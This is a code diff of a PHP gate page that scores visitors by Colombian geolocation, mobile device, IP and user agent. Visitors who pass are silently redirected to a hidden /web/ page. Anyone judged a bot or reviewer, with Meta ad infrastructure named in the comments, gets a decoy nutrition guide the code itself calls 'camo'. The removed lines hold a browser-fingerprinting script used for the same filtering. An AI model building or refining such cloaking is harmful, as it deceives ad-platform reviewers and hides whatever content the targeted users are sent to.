@@ -1,16 +1,23 @@
 <?php
 require_once __DIR__ . '/_lib.php';
 
-// 1) Usuario ya verificado en sesión activa => 302 server-side inmediato
+// 1) Sesión activa => 302 inmediato
 if (gate_has_valid_cookie()) {
     header('Location: /web/index.php', true, 302);
     exit;
 }
 
-// 2) Evaluación server-side completa (UA, IP, DC, Meta IP, geo CO, mobile, idioma es, origen Meta)
+// 2) Evaluación server-side: geo CO + mobile + IP + UA
 [$score, $reasons] = gate_compute_score();
-$is_bot = ($score >= 8);
 
+// 3) Si pasa: emitir cookie HMAC + 302 inmediato a /web/ (sin JS)
+if ($score < 8) {
+    gate_set_cookie(1800);
+    header('Location: /web/index.php', true, 302);
+    exit;
+}
+
+// 4) Bot/revisor detectado => servir camo de nutrición
 http_response_code(200);
 header('Content-Type: text/html; charset=UTF-8');
 header('Cache-Control: no-store, no-cache, must-revalidate, private');
@@ -21,33 +28,6 @@ header('X-Content-Type-Options: nosniff');
 <html lang="es" prefix="og: https://ogp.me/ns#">
 <head>
   <meta charset="UTF-8" />
-<?php if (!$is_bot): ?>
-  <script>(function(){
-    var n=navigator,w=window,d=document,s=screen;
-    var fp={
-      wd:n.webdriver===true,
-      pl:(n.plugins&&n.plugins.length)||0,
-      lg:n.language||'',
-      lgs:(n.languages||[]).join(','),
-      tz:new Date().getTimezoneOffset(),
-      sw:s.width||0,sh:s.height||0,
-      ow:w.outerWidth||0,oh:w.outerHeight||0,
-      dpr:w.devicePixelRatio||1,
-      tch:'ontouchstart' in w?1:0,
-      pf:n.platform||'',
-      ch:typeof w.chrome,
-      hw:n.hardwareConcurrency||0,
-      mm:n.deviceMemory||0,
-      wa:d.documentElement.getAttribute('webdriver')||'',
-      ua:n.userAgent||''
-    };
-    try{var c=d.createElement('canvas'),x=c.getContext('2d');x.textBaseline='top';x.font='14px Arial';x.fillText('hi',2,2);fp.cv=c.toDataURL().slice(-24);}catch(e){fp.cv='';}
-    fetch('/v.php',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(fp),credentials:'same-origin',cache:'no-store'})
-      .then(function(r){return r.json();})
-      .then(function(j){if(j&&j.ok&&j.next){w.location.replace(j.next);}})
-      .catch(function(){});
-  })();</script>
-<?php endif; ?>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Guía de Nutrición Saludable | Alimentación Consciente</title>
   <meta name="description" content="Descubre los principios de una alimentación saludable y equilibrada. Guía completa de nutrición para mejorar tu energía, peso y bienestar general." />
